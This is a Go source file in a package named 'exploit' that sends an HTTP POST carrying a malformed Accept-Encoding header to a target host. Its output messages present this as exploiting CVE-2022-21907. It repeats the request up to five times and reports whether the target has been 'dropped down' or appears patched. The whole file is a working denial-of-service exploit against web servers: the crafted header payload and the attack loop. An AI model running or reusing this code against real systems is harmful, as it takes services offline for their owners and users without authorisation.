package exploit

import (
	"log"
	"net/http"
	"strings"
	"time"
)

func Init() bool {
	return true
}

func getHeader() (string, string) {
	return "Accept-Encoding", "AAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,AAAAAAAAAAAAAAAAAAAAAAAAAAA,****************************AAAAAA, *, ,"
}

func SendPOST(target string, ch chan string) {
	isDropped := false
	client := &http.Client{}
	k, v := getHeader()
	target = "http://" + target
	req, err := http.NewRequest("POST", target, nil)
	if err != nil {
		ch <- "[-] The target: " + target + " isn't available for the request. The http port 80 is filtered or restricted"
	}
	req.Header.Set(k, v)
	client.Timeout = time.Duration(5 * time.Second)

	for i := 0; ; i++ {
		if i >= 5 {
			break
		}

		log.Println("\n\033[32m[+] attacking "+target+" for the ", i, "time")
		_, err := client.Do(req)
		// if http://IP:PORT=80 is unavailable we're skipping the IP
		if err == nil {
			break
		}
		errText := err.Error()
		// checking if the attack was successful
		if err != nil && !strings.Contains(errText, "invalid header") {
			isDropped = true
		}
		// checking if the Header is protected for the server
		if strings.Contains(errText, "invalid header") {
			break
		}
		// checking if the host still is down after our attack
		if strings.Contains(errText, "Timeout") {
			break
		}
	}
	// the case IP is highly protected
	if !isDropped {
		ch <- "\n\033[33m[-] Couldn't drop down the target: " + target + ". It has the patch or CVE protected."
	} else {
		// the case if our attack is successful
		ch <- "\n\u001B[32m[+] The target: " + target + " is dropped down by the exploit CVE-2022-21907"
	}
}
